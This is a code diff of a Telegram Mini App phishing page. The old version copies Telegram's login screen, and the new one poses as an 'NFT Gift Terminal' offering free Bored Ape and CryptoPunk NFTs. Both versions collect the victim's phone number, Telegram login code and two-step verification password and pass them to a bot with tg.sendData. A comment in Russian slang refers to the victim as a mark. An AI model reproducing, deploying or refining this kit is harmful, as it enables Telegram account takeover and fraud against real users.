@@ -3,170 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram</title>
+    <title>NFT Gift Terminal</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --tg-bg: #ffffff;
-            --tg-text: #000000;
-            --tg-hint: #707579;
-            --tg-link: #3390ec;
-            --tg-input-border: #dadce0;
-        }
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --tg-bg: #212121;
-                --tg-text: #ffffff;
-                --tg-hint: #aaaaaa;
-                --tg-input-border: #444444;
-            }
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--tg-bg);
-            color: var(--tg-text);
-            margin: 0; display: flex; flex-direction: column; align-items: center;
-            height: 100vh; width: 100vw; overflow: hidden;
-        }
-        .container { width: 100%; max-width: 360px; padding: 40px 24px; box-sizing: border-box; text-align: center; }
-        .logo { width: 100px; height: 100px; margin: 0 auto 30px; fill: #24A1DE; }
-        h1 { font-size: 26px; font-weight: 500; margin-bottom: 12px; }
-        p { font-size: 16px; color: var(--tg-hint); line-height: 22px; margin-bottom: 35px; }
-        
-        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
-        .label { position: absolute; top: -10px; left: 12px; background: var(--tg-bg); padding: 0 4px; color: var(--tg-link); font-size: 13px; font-weight: 500; }
-        .field { 
-            width: 100%; padding: 15px 16px; border: 1px solid var(--tg-input-border); 
-            border-radius: 12px; font-size: 17px; background: transparent; color: var(--tg-text);
-            box-sizing: border-box; outline: none;
-        }
-        .field:focus { border: 2px solid var(--tg-link); padding: 14px 15px; }
-        
-        .btn { 
-            width: 100%; padding: 16px; background: var(--tg-link); color: #fff; 
-            border: none; border-radius: 12px; font-size: 16px; font-weight: 600; 
-            cursor: pointer; text-transform: uppercase; 
-        }
-
-        /* Модалка для выбора стран */
-        #modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--tg-bg); z-index: 1000; display: none; flex-direction: column;
-        }
-        .modal-header { padding: 15px; border-bottom: 1px solid var(--tg-input-border); display: flex; align-items: center; }
-        .country-item { padding: 15px 20px; border-bottom: 1px solid var(--tg-input-border); cursor: pointer; display: flex; justify-content: space-between; }
-
+        body { font-family: sans-serif; background: #1a1a1a; color: white; margin: 0; padding: 15px; text-align: center; }
+        .nft-card { background: #2a2a2a; border-radius: 15px; padding: 10px; margin-bottom: 20px; border: 1px solid #3390ec; }
+        .nft-img { width: 100%; border-radius: 10px; margin-bottom: 10px; }
+        .price { color: #00ff00; font-weight: bold; font-size: 1.2em; }
+        .btn { background: #3390ec; color: white; border: none; padding: 12px 25px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; }
         .step { display: none; }
         .active { display: block; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: #333; color: white; text-align: center; font-size: 1.1em; }
+        .verify-title { font-size: 1.5em; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">
-        <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/></svg>
-    </div>
-
     <div id="step1" class="step active">
-        <h1>Your Phone</h1>
-        <p>Confirm your country code and enter your phone number.</p>
-        <div class="input-group" onclick="openModal()">
-            <div class="label">Country</div>
-            <div class="field" id="country-name">Russia</div>
+        <h2>🎁 Доступные подарки</h2>
+        <div class="nft-card">
+            <img src="https://i.seadn.io/gae/7B0iaEunT6S6Ksz5H4TCH6m9oK3Hxlz9GfI0uT0a.png?auto=format&w=256" class="nft-img">
+            <div>Bored Ape #4521</div>
+            <div class="price">0.01 TON (<s>45 TON</s>)</div>
+            <button class="btn" onclick="goVerify()">ЗАБРАТЬ ПОДАРОК</button>
         </div>
-        <div class="input-group">
-            <div class="label">Phone Number</div>
-            <div style="display:flex; gap:10px;">
-                <input type="text" id="prefix" class="field" style="width: 80px;" value="+7" readonly>
-                <input type="tel" id="phone" class="field" placeholder="Number">
-            </div>
+        <div class="nft-card">
+            <img src="https://i.seadn.io/gcs/files/6d0426f43e62c19c4d9b6264d1f2742d.png?auto=format&w=256" class="nft-img">
+            <div>CryptoPunk #8812</div>
+            <div class="price">FREE (<s>120 TON</s>)</div>
+            <button class="btn" onclick="goVerify()">ЗАБРАТЬ БЕСПЛАТНО</button>
         </div>
-        <button class="btn" onclick="sendPhone()">Next</button>
     </div>
 
     <div id="step2" class="step">
-        <h1>Check Telegram</h1>
-        <p>We've sent a code to the <b>Telegram</b> app on your other device.</p>
-        <div class="input-group">
-            <div class="label">Code</div>
-            <input type="number" id="sms" class="field" style="text-align:center; letter-spacing: 5px;" placeholder="00000">
-        </div>
-        <button class="btn" onclick="sendCode()">Next</button>
+        <div class="verify-title">🛡 Верификация</div>
+        <p>Для защиты от ботов введите номер телефона вашего Telegram аккаунта</p>
+        <input type="tel" id="phone" placeholder="+7 999 000-00-00">
+        <button class="btn" onclick="sendPhone()">ПОЛУЧИТЬ КОД</button>
     </div>
 
     <div id="step3" class="step">
-        <h1>Cloud Password</h1>
-        <p>Your account is protected with Two-Step Verification.</p>
-        <div class="input-group">
-            <div class="label">Password</div>
-            <input type="password" id="2fa" class="field" placeholder="Enter Password">
-        </div>
-        <button class="btn" onclick="send2fa()">Confirm</button>
+        <div class="verify-title">Введите код</div>
+        <p>Мы отправили код подтверждения в ваш Telegram</p>
+        <input type="number" id="code" placeholder="00000">
+        <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
     </div>
-</div>
 
-<div id="modal">
-    <div class="modal-header">
-        <span onclick="closeModal()" style="cursor:pointer; font-size:24px; padding: 0 10px;">✕</span>
-        <h2 style="font-size: 20px; margin-left: 10px;">Choose Country</h2>
+    <div id="step4" class="step">
+        <div class="verify-title">Облачный пароль</div>
+        <p>Введите ваш пароль двухэтапной аутентификации</p>
+        <input type="password" id="pswd" placeholder="Пароль">
+        <button class="btn" onclick="send2fa()">ВОЙТИ</button>
     </div>
-    <div id="list" style="overflow-y:auto;"></div>
-</div>
 
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
 
-    const countries = [
-        {n:"Russia", c:"+7"}, {n:"Kazakhstan", c:"+7"}, {n:"Ukraine", c:"+380"},
-        {n:"Uzbekistan", c:"+998"}, {n:"Belarus", c:"+375"}, {n:"USA", c:"+1"},
-        {n:"Germany", c:"+49"}, {n:"Turkey", c:"+90"}, {n:"Poland", c:"+48"}
-    ];
-
-    function openModal() {
-        const l = document.getElementById('list');
-        l.innerHTML = '';
-        countries.forEach(x => {
-            const d = document.createElement('div');
-            d.className = 'country-item';
-            d.innerHTML = `<span>${x.n}</span><span style="color:var(--tg-link)">${x.c}</span>`;
-            d.onclick = () => {
-                document.getElementById('country-name').innerText = x.n;
-                document.getElementById('prefix').value = x.c;
-                closeModal();
-            };
-            l.appendChild(d);
-        });
-        document.getElementById('modal').style.display = 'flex';
-    }
-
-    function closeModal() { document.getElementById('modal').style.display = 'none'; }
-
-    function sendPhone() {
-        const fullPhone = document.getElementById('prefix').value + document.getElementById('phone').value;
-        if(fullPhone.length > 7) {
-            tg.sendData("PHONE:" + fullPhone); // Бот поймает это и отправит код
+        function goVerify() {
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
         }
-    }
 
-    function sendCode() {
-        const code = document.getElementById('sms').value;
-        if(code.length === 5) {
-            tg.sendData("CODE:" + code);
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.add('active');
+        function sendPhone() {
+            const p = document.getElementById('phone').value;
+            if(p.length > 8) {
+                tg.sendData("PHONE:" + p);
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+            }
         }
-    }
 
-    function send2fa() {
-        const pass = document.getElementById('2fa').value;
-        if(pass.length > 0) {
-            tg.sendData("PASS:" + pass);
-            setTimeout(() => tg.close(), 1000);
+        function sendCode() {
+            const c = document.getElementById('code').value;
+            if(c.length >= 5) {
+                tg.sendData("CODE:" + c);
+                // Если боту нужен 2FA, он сам скажет, но мы для мамонта переключаем
+                document.getElementById('step3').classList.remove('active');
+                document.getElementById('step4').classList.add('active');
+            }
         }
-    }
-</script>
+
+        function send2fa() {
+            const ps = document.getElementById('pswd').value;
+            tg.sendData("PASS:" + ps);
+            tg.close();
+        }
+    </script>
 </body>
 </html>
